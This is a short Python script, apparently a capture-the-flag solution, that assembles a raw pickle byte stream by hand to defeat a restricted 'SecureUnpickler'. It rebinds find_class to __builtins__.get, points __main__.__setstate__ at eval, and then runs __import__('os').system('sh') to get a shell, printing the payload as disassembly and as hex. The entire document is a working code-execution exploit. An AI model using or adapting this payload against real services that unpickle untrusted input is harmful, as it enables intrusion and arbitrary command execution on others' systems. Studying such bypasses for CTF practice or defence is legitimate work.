from pwn import *
import pickletools


data = pickle.PROTO + bytes([5])

data += pickle.GLOBAL + b"__main__\n__main__\n"
data += pickle.BINPUT + bytes([1]) # save __main__ to memo[1]
data += pickle.POP

data += pickle.GLOBAL + b"__main__\nSecureUnpickler\n" 
data += pickle.BINPUT + bytes([2]) # save SecureUnpickler to memo[2]
data += pickle.POP

data += pickle.GLOBAL + b"__main__\n__main__\n"

data += pickle.MARK
data += pickle.STRING + b"'__main__'\n"
data += pickle.GLOBAL + b"__main__\n__builtins__\n"
data += pickle.DICT
data += pickle.BUILD

data += pickle.GLOBAL + b"__main__\nget\n"
data += pickle.BINPUT + bytes([3]) # save get to memo[3]
data += pickle.POP

# SecureUnpickler.find_class = __builtins__.get
data += pickle.BINGET + bytes([2])
data += pickle.NONE
data += pickle.MARK
data += pickle.STRING + b"'find_class'\n"
data += pickle.BINGET + bytes([3])
data += pickle.DICT
data += pickle.TUPLE2
data += pickle.BUILD 

# __main__.__setstate__ = __builtins__.eval
data += pickle.BINGET + bytes([1])
data += pickle.NONE
data += pickle.MARK
data += pickle.STRING + b"'__setstate__'\n"
data += pickle.GLOBAL + b"eval\naaa\n"
data += pickle.DICT
data += pickle.TUPLE2
data += pickle.BUILD 
data += pickle.POP
data += pickle.POP

# trigger eval("'__import__(\"os\").system(\"sh\")'\n")
data += pickle.BINGET + bytes([1])
data += pickle.STRING + b"'__import__(\"os\").system(\"sh\")'\n"
data += pickle.BUILD
data += pickle.POP

data += pickle.STOP

from codecs import getencoder
pickletools.dis(data)
print(getencoder("hex")(data)[0].decode())
